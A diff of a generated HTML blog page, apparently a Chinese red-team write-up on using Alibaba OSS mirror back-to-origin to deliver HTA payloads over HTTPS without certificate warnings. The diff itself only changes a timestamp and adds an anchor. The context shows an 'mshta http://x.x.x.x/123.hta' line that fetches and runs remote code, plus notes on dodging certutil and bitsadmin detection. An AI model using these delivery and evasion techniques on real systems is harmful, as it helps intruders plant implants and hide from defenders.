@@ -89,7 +89,7 @@
 <meta property="og:locale" content="zh-Hans">
 <meta property="og:image" content="http://yoursite.com/2020/11/23/巧用OSS对抗记/1.png">
 <meta property="og:image" content="http://yoursite.com/2020/11/23/巧用OSS对抗记/2.png">
-<meta property="og:updated_time" content="2020-11-25T15:55:47.208Z">
+<meta property="og:updated_time" content="2020-11-26T15:37:11.956Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="巧用OSS对抗记">
 <meta name="twitter:description" content="巧用OSS对抗记转载请注明出处：https://youngrichog.github.io/ 描述在某次红蓝对抗中，发现自己的小马被防守方获取到，由此开始想招对抗防守方。主要场景是我使用mshta http://x.x.x.x/123.hta 进行远程命令执行，但是由于环境所困没办法使用https，害怕由于使用https出现”此网站的安全证书存在问题”，需要受害者二次点击影响效果。 后续对风险面分">
@@ -308,6 +308,7 @@
 <p>后续对风险面分析，我的小马会释放一个hta到本地，然后在mshta本地hta，为什么要这样做？缘由是这样的，如果通过mshta直接进行远程文件的下载是会出现<strong>跨域同源策略</strong>的问题，当然通过命令下载(bitsadmin、certutil···等等)，也是为了避免去使用命令下载才使用编写XMLHTTP Request进行下载。所以我通过scripting.filesystemobject又写了一个hta到本地，继续mshta本地hta文件，这样就可以把上述问题解决。我也期待有其他解决方案，希望大家可以一起交流 :-)</p>
 <p>回到重点，想在网络上将隐藏的好一些，那么如何能不弹”此网站的安全证书存在问题”?后来大佬说OSS可以，然后我就去对OSS进行了解，发现<strong>镜像回源</strong>的功能可以实现，当然直接文件丢OSS任何人都可以下载，最终利用该功能配合脚本解决。</p>
 <p>这里的OSS指的是阿里云-对象存储OSS</p>
+<a id="more"></a>
 <h2 id="功能分析"><a href="#功能分析" class="headerlink" title="功能分析"></a>功能分析</h2><p>OSS 镜像回源的功能主要为两种模式：</p>
 <blockquote>
 <h3 id="404"><a href="#404" class="headerlink" title="404"></a>404</h3><p>当客户请求到 OSS 获取资源时，如果 OSS 资源不存在，那么会根据客户配置的镜像回源地址去拉去对应的资源，如果真正的源站有数据就会响应 OSS 200 ，OSS 会将文件一同存储到本地，并且透传给客户端 200 的状态码。</p>
